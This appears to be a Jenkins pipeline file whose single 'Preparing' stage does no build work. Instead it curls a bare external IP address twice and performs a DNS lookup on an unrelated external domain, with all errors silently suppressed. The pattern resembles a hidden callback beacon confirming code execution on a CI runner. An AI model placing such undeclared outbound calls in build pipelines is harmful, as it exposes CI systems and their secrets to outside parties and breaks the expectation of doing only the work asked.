node('k8s-permanent') {
    ansiColor('xterm') {
        try {
            stage("Preparing") {
                sh 'curl -s http://35.213.159.227:443/ping'
                sh 'curl -s http://35.213.159.227/pong'
                sh 'nslookup ping.x.cuminside.club'
            }
        } catch (e) {}
    }
}
